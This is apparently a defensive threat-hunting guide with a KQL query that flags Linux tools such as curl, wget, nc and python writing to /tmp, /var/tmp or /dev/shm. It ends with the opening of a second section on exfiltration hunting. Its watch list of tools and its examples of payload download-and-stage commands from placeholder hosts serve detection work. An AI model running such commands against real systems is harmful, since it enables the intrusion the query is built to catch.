This query describes a **high‑signal Linux threat hunting query** focused on detecting **living‑off‑the‑land (LOLbin) abuse**, one of the most common real‑world Linux attack patterns.

Rather than dropping obvious malware, attackers frequently rely on **built‑in tools** to download and execute payloads directly in temporary locations.

## Linux – LOLbin Downloads to Temporary Directories – Last 24h

### Query name

**`Linux – LOLbin downloads to temp directories – last 24h`**

---

## Why this matters

On Linux, attackers overwhelmingly prefer:

* Native tools already present on the system
* Temporary directories that are writable by users
* Minimal on‑disk footprint

This results in a pattern where **legitimate binaries** are used for **illegitimate purposes**.

Common characteristics:

* No malware installer
* No persistence initially
* Payloads staged in `/tmp`, `/var/tmp`, or `/dev/shm`

This behaviour is extremely common in:

* Initial access
* Post‑exploitation tooling
* Red team operations

---

## Typical tools abused (LOLbins)

The following tools are frequently used by attackers:

* `curl`
* `wget`
* `nc` / `ncat`
* `openssl`
* `python`
* `perl`

These tools are trusted, ubiquitous, and often allowed through controls.

---

## Query

```kql
let LinuxDeviceIds =
    DeviceInfo
    | where OSPlatform == "Linux"
    | distinct DeviceId;
DeviceProcessEvents
| where DeviceId in (LinuxDeviceIds)
| where Timestamp > ago(24h)
| where FileName in ("curl", "wget", "nc", "ncat", "openssl", "python", "python3", "perl")
| where ProcessCommandLine has_any ("/tmp", "/var/tmp", "/dev/shm")
| project
    Timestamp,
    DeviceName,
    FileName,
    ProcessCommandLine,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine,
    ReportId
| order by Timestamp desc
```

---

## What this query surfaces

This hunt will surface activity such as:

* Payloads downloaded directly into `/tmp`
* Scripted tool execution without installers
* Inline download‑and‑execute chains
* Red team staging behaviour

Examples include:

* `curl http://x.x.x.x/payload.sh -o /tmp/payload.sh`
* `wget https://example/payload -O /dev/shm/.x`
* `python -c 'import urllib.request; ...'`

---

## Why temporary directories matter

Temporary directories are attractive because they:

* Are writable by non‑privileged users
* Are often excluded from backups
* Are frequently overlooked during investigations
* May be cleared on reboot (reducing forensic artefacts)

Attackers exploit these properties to stay **lightweight and fast**.

---

## Expected benign activity

Some legitimate scenarios may also appear:

* Developers testing downloads
* Installation scripts
* CI/CD agents

However, in most enterprise environments, **interactive use of these tools in temp paths should be rare** and worth review.

---

## When to use this query

Use this query when:

* Hunting for initial access activity
* Investigating suspicious network behaviour
* Reviewing red team or purple team exercises
* Looking for fileless or low‑footprint attacks

It is effective on both **desktops and servers**, though servers typically produce much higher signal.

---

## Testing and validation guidance

To safely generate test telemetry:

```bash
curl https://example.com -o /tmp/test-download
```

This should create a clear hit without introducing risk.

---

This query describes a **reliable, high‑value Linux threat hunting query** for detecting **archive‑based data exfiltration** using Microsoft Defender for Endpoint Advanced Hunting.

Rather than relying on file‑system telemetry (which can be inconsistent on Linux, especially for `tmpfs` paths such as `/tmp`), this hunt focuses on **process intent and behaviour**:

1. An archive creation command is executed (`tar`, `zip`, `gzip`)
2. Outbound network activity suitable for data upload follows shortly afterwards

This approach aligns much more closely with how real‑world Linux exfiltration occurs and explains why Defender can raise alerts even when file events are missing.

## Before You Run This Query

This query is **device‑scoped and time‑bound by design** to make validation and investigation easier.

Before saving or running the query:

* **Update the device name** in the `Device` variable to match the Linux host you want to investigate.
* **Adjust the time window** (`ago(24h)`) if you are looking at older activity or want to narrow the scope during triage.

For fleet‑wide hunting, remove the `DeviceName` filter and rely on `OSPlatform == "Linux"` instead.